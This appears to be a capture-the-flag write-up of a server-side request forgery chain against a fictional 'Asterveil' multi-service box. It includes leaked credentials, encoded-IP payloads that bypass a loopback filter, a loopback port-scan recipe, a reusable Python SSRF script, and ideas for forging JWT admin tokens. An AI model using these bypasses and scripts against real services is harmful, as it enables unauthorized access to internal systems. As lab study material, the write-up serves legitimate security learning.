# Asterveil SSRF chain — worked repro (CTF7, multi-service box 2.29.10.21)

## Topology observed
- `:8084` Asterveil Employee Verification Portal (PHP/Apache) — self-registration, employee
  portal, hardened ZIP-upload verification on `/documents`. `robots.txt` Disallows `/admin`;
  `/admin` exists (302) but is firewalled externally.
- `:8082` Asterveil Partner Operations / Treasury Integrations (webhook delivery tester, SPA).
  Creds leak in page source: `settlement_ops` / `Asterveil#2026`. Issues HS256 JWT
  (`{sub,username,iat,exp}`). Endpoint `POST /api/integrations/webhook/test`,
  `Authorization: Bearer <jwt>`, body `{url, method, headers, body}`; **reflects** the target
  response as `{delivery, status, duration_ms, content_type, response_preview, truncated}`.

## Why SSRF was the intended vector
"Unusual activity within one of its applications" = the webhook tester was abused to reach
internal endpoints. The tester blocks literal loopback/private URLs with
`{"error":"Private and loopback webhook destinations are not permitted"}` (403).

## Bypass that worked (literal-string filter)
Decimal/hex/octal encoding of the IP survives the string check:
```
http://2130706433:8084/admin     -> 502 Connection refused   (127.0.0.1 decimal, filter PASSED)
http://0x7f000001/  / http://0177.0.0.1/ / http://127.1/ / http://0/  -> same bypass
```
Blocked by the same filter: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`,
`http://127.0.0.1.nip.io/`, `http://localtest.me/`, `http://evil.com@127.0.0.1/`.
Rejected by urlopen (no body): `file:///etc/passwd` -> `status: null`.

## Key pivot: loopback refused != down — use the PUBLIC IP
`http://2130706433:8084/admin` => 502 **refused** (8084 is on a SEPARATE container),
but `http://2.29.10.21:8084/admin` (the box's own public IP) => **302** and was
reachable through the tester. So: when decimal-IP loopback is refused, pivot to the
sink's public IP/hostname to hit the firewalled internal endpoint.

## Loopback port-scan recipe (decimal IP, fast — refused is instant)
```python
def ip2dec(ip): a,b,c,d=map(int,ip.split(".")); return (a<<24)|(b<<16)|(c<<8)|d
# 2130706433=127.0.0.1 ; 2886729729=172.17.0.1 ; 167772161=10.0.0.1
# url = f"http://{ip2dec('127.0.0.1')}:{port}/"
# 502 + "Connection refused" in detail => closed; anything else => open/service
```
On 8082's localhost only `:8080` (itself) was open — confirming no co-located internal
service; the target lived on the public IP.

## Caveats / where it stopped
- `/admin` returns 302 (redirect) but the API does NOT return response headers, so the
  `Location` was never observed; all `/admin/*` sub-paths probed returned the 404 placeholder
  (`Page not found · Asterveil`). The flag was not extracted in-session.
- Decimal-encoded RFC1918 scan (10./172./192.168.) timed out hard on the flaky box — inconclusive.
- Next leads if resuming: crack the HS256 JWT (try `Asterveil#2026` / `asterveil` / default
  secrets) and forge an `admin` role to hit `8082`'s `/api/admin/*`; or stand up a redirect
  server the tester can call back to (does it follow 30x? untested) to follow the `/admin` 302.

## Reusable script fragment (reflected tester)
```python
S.post(f"{BASE}/api/auth/login", json={"username":"settlement_ops","password":"Asterveil#2026"})
tok = r.json()["token"]
H = {"Authorization": f"Bearer {tok}", "Content-Type":"application/json"}
def ssrf(u):
    return S.post(f"{BASE}/api/integrations/webhook/test", headers=H,
                  json={"url":u,"method":"GET","headers":{"Content-Type":"application/json"}}).json()
# ssrf("http://2130706433:8084/admin")  # bypasses loopback string filter
# ssrf("http://2.29.10.21:8084/admin")  # reaches firewalled internal endpoint via public IP
```
